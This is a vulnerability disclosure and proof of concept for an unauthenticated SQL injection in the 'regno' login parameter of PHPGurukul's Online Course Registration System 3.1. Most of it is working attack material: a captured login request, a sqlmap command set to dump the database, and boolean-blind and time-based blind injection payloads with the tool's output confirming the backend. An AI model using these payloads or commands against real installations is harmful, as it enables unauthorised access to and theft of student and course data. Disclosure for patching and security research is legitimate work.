# Online Course Registration System - SQL Injection - 3 (Unauthenticated)
+ **Exploit Title:** Online Course Registration System - SQL Injection - 3 (Unauthenticated)
+ **Date:** 2024-17-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/online-course-registration-free-download/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=7515
+ **Version:** 3.1
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Online Course Registration System allows SQL Injection via the 'regno' parameter at "http://localhost/onlinecourse/index.php". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/onlinecourse/index.php"
+ Try logging in by typing random things
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
POST /onlinecourse/ HTTP/1.1
Host: localhost
Content-Length: 31
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/onlinecourse/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=cc12r4c7k38a4endfa1btuk5he
Connection: close

regno=123&password=test&submit=
```

+ Use sqlmap to exploit. In sqlmap, use 'regno' parameter to dump the database.
```
sqlmap -r r.txt -p regno --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: regno (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: regno=123' OR NOT 6587=6587-- Tsmv&password=test&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: regno=123' AND (SELECT 5477 FROM (SELECT(SLEEP(5)))HgAT)-- gyBT&password=test&submit=
---
[19:40:07] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:40:07] [INFO] fetching current database             
current database: 'onlinecourse
```
+ current database: `onlinecourse`

![Ekran görüntüsü 2024-05-16 133541](https://github.com/BurakSevben/CVEs/assets/117217689/aa1d7d61-4584-47fb-97a8-702d6ac69457)
